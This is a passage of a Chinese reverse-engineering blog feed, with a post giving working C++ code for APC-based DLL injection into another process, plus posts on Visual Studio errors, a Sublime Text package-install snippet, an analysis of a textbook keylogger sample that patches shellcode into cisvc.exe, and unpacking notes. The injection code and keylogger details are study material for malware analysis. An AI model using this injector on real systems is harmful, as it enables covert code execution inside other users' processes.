    <content type="html"><![CDATA[<p>APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下：</p><pre><code>1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()时，系统就会产生一个软中断（或者是Messagebox弹窗的时候不点OK的时候也能注入）。2）当线程再次被唤醒时，此线程会首先执行APC队列中的被注册的函数。3）利用QueueUserAPC()这个API可以在软中断时向线程的APC队列插入一个函数指针，如果我们插入的是Loadlibrary()执行函数的话，就能达到注入DLL的目的。</code></pre><p>程序如下:</p><pre><code>// TESTAPC2.cpp : 定义控制台应用程序的入口点。//#include &quot;stdafx.h&quot;#include &lt;string&gt;#include&lt;windows.h&gt;#include&lt;shlwapi.h&gt;#include&lt;tlhelp32.h&gt;#include&lt;winternl.h&gt;#pragma comment(lib,&quot;shlwapi.lib&quot;)#pragma comment(lib,&quot;ntdll.lib&quot;)using namespace std;//根据进程名获取PIDDWORD GetPidFormName(wstring wsProcessname){    HANDLE hSnaoshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    if (hSnaoshot == INVALID_HANDLE_VALUE)    {        return false;    }    PROCESSENTRY32W pe = { sizeof(pe) };    BOOL bok;    for (bok = Process32FirstW(hSnaoshot, &amp;pe); bok; bok = Process32NextW(hSnaoshot,&amp;pe))    {        wstring wsNowProcName = pe.szExeFile;        if (StrStrI(wsNowProcName.c_str(), wsProcessname.c_str()) != NULL)        {            CloseHandle(hSnaoshot);            return pe.th32ProcessID;        }    }    CloseHandle(hSnaoshot);    return 0;}//dll 文件注入到进程wsProcessnameBOOL Injection_APC(const wstring &amp;wsProcessname, const WCHAR wcCacheInDllPath[]){    DWORD dwProcessId = GetPidFormName(wsProcessname);    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);    if (!hProcess)    {        return FALSE;    }    PVOID lpData = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);    DWORD dwRet;    if (lpData)    {        //在远程进程申请空间写入待注入dll 的路径        WriteProcessMemory(hProcess, lpData, (LPVOID)wcCacheInDllPath,MAX_PATH, &amp;dwRet);        CloseHandle(hProcess);    }    //开始注入    THREADENTRY32 te = { sizeof(te) };    HANDLE handleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);//遍历系统中所有线程    if (handleSnap == INVALID_HANDLE_VALUE)    {        return false;    }    bool bstat = false;    if (Thread32First(handleSnap, &amp;te))    {        do {            if (te.th32OwnerProcessID == dwProcessId)            {                HANDLE handleThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);                if (handleThread)                {                    DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryW, handleThread, (ULONG_PTR)lpData);                }                if (dwRet &gt; 0)                {                    bstat = TRUE;                }                CloseHandle(handleThread);            }        } while (Thread32Next(handleSnap, &amp;te));        CloseHandle(handleSnap);        return bstat;    }    }    int main()    {        Injection_APC(L&quot;testapc.exe&quot;, L&quot;testapcdll.dll&quot;);        return 0;    }</code></pre><p>测试exe程序：</p><pre><code>#include&lt;windows.h&gt;int main(){    MessageBox(NULL, L&quot;start&quot;, L&quot;tit&quot;, MB_OK);    SleepEx(1000 * 60 * 5, true);    MessageBox(NULL, L&quot;end&quot;, L&quot;tit&quot;, MB_OK);    Sleep(-1);}</code></pre><p>测试dll 程序：</p><pre><code>#include&lt;windows.h&gt;#include&quot;dll.h&quot;BOOL APIENTRY DllMain(HANDLE hModule, DWORD dwReason, void* lpReserved){    switch (dwReason)    {        // 动态链接库映射到某个进程的地址空间    case DLL_PROCESS_ATTACH:        MessageBox(NULL, L&quot;in apc ok~&quot;, L&quot;tit&quot;, MB_OK);        /**        * 当DLL刚被加载时触发（LoadLibrary），此处专门用来做初始化工作，        * 如果初始化失败可以返回 false 这样DLL就不会被继续加载了        **/        break;        // 应用程序创建新的线程    case DLL_THREAD_ATTACH:        break;        // 应用程序某个线程正常终止    case DLL_THREAD_DETACH:        break;        // 动态链接库将被卸载    case DLL_PROCESS_DETACH:        /**        * 当DLL将要被卸载时触发（FreeLibrary）,此处专门用来做清理工作        * 如关闭文件，释放内存空间等        **/        break;    }    return 1;}/*void helloDLL(void){//MessageBox(NULL, TEXT(&quot;Hello DLL~&quot;), TEXT(&quot;Title&quot;), MB_OK);}*/</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;APC注入的原理是利用当线程被唤醒时APC中的注册函数会被执行的机制，并以此去执行我们的DLL加载代码，进而完成DLL注入的目的，其具体流程如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1）当EXE里某个线程执行到SleepEx()或者WaitForSingleObjectEx()
      
    
    </summary>
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>VS错误集</title>
    <link href="http://scuzhangzhang.github.io/2017/09/14/vs%E9%94%99%E8%AF%AF%E9%9B%86/"/>
    <id>http://scuzhangzhang.github.io/2017/09/14/vs错误集/</id>
    <published>2017-09-13T16:00:00.000Z</published>
    <updated>2017-10-25T04:01:47.164Z</updated>
    
    <content type="html"><![CDATA[<p>一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window    F:\c\window\window\MSVCRTD.lib(exe_main.obj)    </p><p>&emsp;&emsp;原因是c语言程序找不到适当的入口程序函数<br>般情况下，</p><p>&emsp;&emsp;如果是windows程序，那么WinMain是入口函数，在VS2017中新建项目为“win32项目”</p><p>&emsp;&emsp;如果是dos控制台程序，那么main是入口函数，在VS2017中新建项目为“win32控制台应用程序”而如果入口函数指定不当，很显然c语言运行时找不到配合函数，它就会报告错误。修改设置适应你的需求</p><p>&emsp;&emsp;如果是windows程序：</p><ul><li><p>1.菜单中选择 工程-&gt;属性, 弹出属性窗口</p></li><li><p>2.在左边栏中依次选择：配置属性-&gt;C/C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_CONSOLE, 添加_WINDOWS.</p></li><li><p>3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为Windows(/SUBSYSTEM:WINDOWS)<br>如果是控制台程序：</p></li><li><p>1.菜单中选择 工程-&gt;属性, 弹出弹出属性窗口</p></li><li>2.在左边栏中依次选择：配置属性-&gt;C/C++-&gt;预处理器,然后在右边栏的预处理器定义对应的项中删除_WINDOWS, 添加_CONSOLE.</li><li>3.在左边栏中依次选择：配置属性-&gt;链接器-&gt;系统,然后在右边栏的SubSystem对应的项改为CONSOLE(/SUBSYSTEM:CONSOLE)</li></ul><p>二  vs2015丢失msvcp140.dll 无法运行程序</p><p>1.可以选择静态编译</p><p><img src="https://i.imgur.com/hetjIa8.png" alt=""></p><p>初始状态是这样的</p><p><img src="https://i.imgur.com/pXqN4Tq.png" alt=""></p><p>2.安装vs2015运行库。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一 .无法解析的外部符号 _main，该符号在函数 “int __cdecl invoke_main(void)” (?invoke_main@@YAHXZ) 中被引用window    F:\c\window\window\MSVCRTD.lib(exe_main.obj
      
    
    </summary>
    
      <category term="编程" scheme="http://scuzhangzhang.github.io/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="编程" scheme="http://scuzhangzhang.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>sublime中文乱码处理</title>
    <link href="http://scuzhangzhang.github.io/2017/09/13/sublime%E4%B9%B1%E7%A0%81%E5%A4%84%E7%90%86/"/>
    <id>http://scuzhangzhang.github.io/2017/09/13/sublime乱码处理/</id>
    <published>2017-09-12T16:00:00.000Z</published>
    <updated>2017-10-25T07:30:17.720Z</updated>
    
    <content type="html"><![CDATA[<p>一、安装包管理器<br>使用Ctrl+~快捷键或者通过View-&gt;Show Console菜单打开命令行，粘贴如下代码</p><pre><code>import urllib.request,os; pf = &apos;Package Control.sublime-package&apos;; ipp = sublime.installed_packages_path(); urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); open(os.path.join(ipp, pf), &apos;wb&apos;).write(urllib.request.urlopen( &apos;http://sublime.wbond.net/&apos; + pf.replace(&apos; &apos;,&apos; &apos;)).read())</code></pre><p>顺利的话，此时就可以在Preferences菜单下看到Package Settings和Package Control两个菜单了</p><p>二、安装乱码处理插件：</p><pre><code>调用ctrl+shift+p,输入：install package，回车，在稍后弹出的安装包框中搜索：ConvertToUTF8或者GBK Encoding Support，选择点击安装；</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;一、安装包管理器&lt;br&gt;使用Ctrl+~快捷键或者通过View-&amp;gt;Show Console菜单打开命令行，粘贴如下代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import urllib.request,os; pf = &amp;apos;Package Control.sublim
      
    
    </summary>
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/categories/%E6%9D%82%E5%AD%A6/"/>
    
    
      <category term="杂学" scheme="http://scuzhangzhang.github.io/tags/%E6%9D%82%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>shellcode 实现键盘记录样本分析</title>
    <link href="http://scuzhangzhang.github.io/2017/09/11/shellcode%20%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>http://scuzhangzhang.github.io/2017/09/11/shellcode 实现键盘记录样本分析/</id>
    <published>2017-09-10T16:00:00.000Z</published>
    <updated>2017-10-25T07:02:55.837Z</updated>
    
    <content type="html"><![CDATA[<p>1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.<br>2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到</p><pre><code>C:\WINDOWS\System32\inet_epar32.dllzzz69806582net start cisvcC:\WINDOWS\System32\%scisvc.exeLab11-03.dll</code></pre><p>等字符串，C:\WINDOWS\System32\inet_epar32.dll表示程序可能加载该dll,net start cisvc是服务的启动方式，cisvc.exe代表该程序可能被启动。然后对Lab11-03.dll进行分析，出现了</p><pre><code>C:\WINDOWS\System32\kernel64x.dllzzz69806582GetForegroundWindowGetAsyncKeyState</code></pre><p>等，C:\WINDOWS\System32\kernel64x.dll表示程序可能加载该dll，zzz69806582暂时还看不出来有什作用，GetForegroundWindow，GetAsyncKeyState表示这很可能是一个键盘记录器。<br>3.然后进行动态分析，命令行切到当前目录下，运行Lab11-03.exe，用procmon和procexp进行监控，</p><p><img src="https://i.imgur.com/7WpA6fl.png" alt=""></p><p>如图可以看到该样本启动了一个服务。至于启动什么服务，通过procmon来具体看。<br>在进程栏看到了net start cisvc</p><p><img src="https://i.imgur.com/z1cNgvE.png" alt=""></p><p>在文件操作一栏我们可以看到创建并写入了文件inet_epar32.dll,打开了cisvc.exe<br>但是并没有写入文件的操作。</p><p><img src="https://i.imgur.com/zKoDTRC.png" alt=""></p><p>在注册表一栏并没有看到什么信息。此时我们更换过滤条件，查看一下cisvc.exe进行了哪些操作。可以看到加载inet_epar32.dll，在系统文件夹中创建了kernel64x.dll文件，并写入了一些内容猜测是键盘记录的内容。</p><p><img src="https://i.imgur.com/8gZK3jo.png" alt=""></p><p>4.下面进行静态高级分析。把Lab11-03.exe和Lab11-03.dll分别载入ida进行分析。<br>代码反编译为c可以看到很简单。</p><p><img src="https://i.imgur.com/bE6edAP.png" alt=""></p><p>首先是把Lab11-03.dll复制为C:\WINDOWS\System32\inet_epar32.dll，然后sub_401070函数时对cisvc.exe的操作，看到是对cisvc.exe进行文件映射然后byte_409030位置的314个字节的内容写到cisvc.exe的开始位置，很显示cisvc.exe插入了一段shellcode,下面查看这段shellcode,在409030位置可以看到是原始字节内容，按c可以反汇编为汇编代码，如图</p><p><img src="https://i.imgur.com/LILvS7S.png" alt=""><br><img src="https://i.imgur.com/UQhv1WM.png" alt=""></p><p>如图是shellcode 代码，在sehcode 末尾是一些字符串，按a可以显示完整字符串，猜测此shellc是加载该dll,后面的字符串仍然不知道是什么。</p><p><img src="https://i.imgur.com/xjBjblH.png" alt=""></p><p>此时我们用ida加载inet_epart32.dll也即是Lab11-03.dll，在导出函数中我们可以看到是以上的未知字符串刚好是其的导出函数，分析该函数看到仅仅只是创建了一个线程，分析该线程，可以看到此线程是实现键盘记录的，其记录保存在C:\WINDOWS\System32\kernel64x.dll中。</p><p>下面对cisvc.exe进行分析。分析插入shellcode前后的变化。首先用PE view查看pe头的变化。可以看到入口位置发生了变化。</p><p><img src="https://i.imgur.com/JjL5XdL.png" alt=""></p><p>分别用ida载入，可以看到插入shellcode的cisvc.exe入口点直接就是shellcode代码，在od中载入，然后单步运行观察shellcode的功能。</p><p><img src="https://i.imgur.com/4NzLH89.png" alt=""></p><p>如图1001b0a位置是加载C:\WINDOWS\System32\inet_epar32.dll的位置，下面是获取<br>zzz69806582函数地址。到此整个流程就分析完了。</p><p>Lab11-03.exe把Lab11-03.dll复制为C:\WINDOWS\System32\inet_epar32.dll，启动cisvc服务，然后再cisvc.exe中插入一段shellcode，来实现键盘记录，记录保存在C:\WINDOWS\System32\kernel64x.dll。打开notepad随便输入进行测试，然后用flexhex打开C:\WINDOWS\System32\kernel64x.dll，可以看到记录了notepad和输入的内容。<br><img src="https://i.imgur.com/D2eC7AJ.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.样本来源于《恶意代码分析实战》的实验样本Lab11-03.exe和Lab11-03.dll.&lt;br&gt;2.首先对Lab11-03.exe进行基础分析，查看字符串和导入导出函数。用strings可以看到&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;C:\WINDOWS\System32\
      
    
    </summary>
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>常规脱壳</title>
    <link href="http://scuzhangzhang.github.io/2017/08/09/%E5%B8%B8%E8%A7%84%E8%84%B1%E5%A3%B3/"/>
    <id>http://scuzhangzhang.github.io/2017/08/09/常规脱壳/</id>
    <published>2017-08-08T16:00:00.000Z</published>
    <updated>2017-10-25T06:54:05.611Z</updated>
    
    <content type="html"><![CDATA[<p>1.单步跟</p><p>2.esp</p><p>3.二次内存镜像</p><p>4.一次到位</p><p>5.模拟跟踪</p><blockquote><p>tc eip&lt;sfx</p><p>调试 sfx  第二个</p></blockquote><p>6.最后一次异常</p><p>7.特殊方法</p><p>at GetVersion等</p><p>注意：当用OD插件脱壳后不能运行时，可以用loadpe修正镜像大小，然后再重建输入表，再看是否成功，不行的话，手动找一找IAT的起始位置和结束为止，看Import REC 的RVA和大小是否一致，如果还不行就用load pe重建PE</p><p>常用语言的入口特征：</p><p>VB：</p><pre><code>004012D4 &gt;  68 54474000     push QQ个性网.00404754004012D9    E8 F0FFFFFF     call &lt;jmp.&amp;MSVBVM60.#100&gt;004012DE    0000            add byte ptr ds:[eax],al004012E0    0000            add byte ptr ds:[eax],al004012E2    0000            add byte ptr ds:[eax],al004012E4    3000            xor byte ptr ds:[eax],al004012E6    0000            add byte ptr ds:[eax],al004012E8    48              dec eax</code></pre><p>delphi:</p><pre><code>004A5C54 &gt;  55              push ebp004A5C55    8BEC            mov ebp,esp004A5C57    83C4 F0         add esp,-10004A5C5A    B8 EC594A00     mov eax,openpro.004A59EC</code></pre><p>BC++:</p><pre><code>00401678 &gt; /EB 10           jmp short btengine.0040168A0040167A   |66:623A         bound di,dword ptr ds:[edx]0040167D   |43              inc ebx0040167E   |2B2B            sub ebp,dword ptr ds:[ebx]00401680   |48              dec eax00401681   |4F              dec edi00401682   |4F              dec edi00401683   |4B              dec ebx00401684   |90              nop00401685  -|E9 98005400     jmp 009417220040168A   \A1 8B005400     mov eax,dword ptr ds:[54008B]0040168F    C1E0 02         shl eax,200401692    A3 8F005400     mov dword ptr ds:[54008F],eax00401697    52              push edx00401698    6A 00           push 00040169A    E8 99D01300     call &lt;jmp.&amp;KERNEL32.GetModuleHandleA&gt;0040169F    8BD0            mov edx,eax</code></pre><p>VC++:</p><pre><code>0040A41E &gt;  55              push ebp0040A41F    8BEC            mov ebp,esp0040A421    6A FF           push -10040A423    68 C8CB4000     push 跑跑排行.0040CBC80040A428    68 A4A54000     push &lt;jmp.&amp;MSVCRT._except_handler3&gt;0040A42D    64:A1 00000000  mov eax,dword ptr fs:[0]0040A433    50              push eax0040A434    64:8925 0000000&gt;mov dword ptr fs:[0],esp0040A43B    83EC 68         sub esp,680040A43E    53              push ebx0040A43F    56              push esi0040A440    57              push edi</code></pre><p>MASM(汇编):</p><pre><code>004035C9 &gt;  6A 00           push 0004035CB    E8 A20A0000     call &lt;jmp.&amp;kernel32.GetModuleHandleA&gt;004035D0    A3 5B704000     mov dword ptr ds:[40705B],eax004035D5    68 80000000     push 80004035DA    68 2C754000     push 11.0040752C004035DF    FF35 5B704000   push dword ptr ds:[40705B]004035E5    E8 820A0000     call &lt;jmp.&amp;kernel32.GetModuleFileNameA&gt;004035EA    E8 87070000     call 11.00403D76004035EF    6A 00           push 0004035F1    68 0B364000     push 11.0040360B004035F6    6A 00           push 0004035F8    6A 64           push 64004035FA    FF35 5B704000   push dword ptr ds:[40705B]</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.单步跟&lt;/p&gt;
&lt;p&gt;2.esp&lt;/p&gt;
&lt;p&gt;3.二次内存镜像&lt;/p&gt;
&lt;p&gt;4.一次到位&lt;/p&gt;
&lt;p&gt;5.模拟跟踪&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;tc eip&amp;lt;sfx&lt;/p&gt;
&lt;p&gt;调试 sfx  第二个&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://scuzhangzhang.github.io/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
</feed>
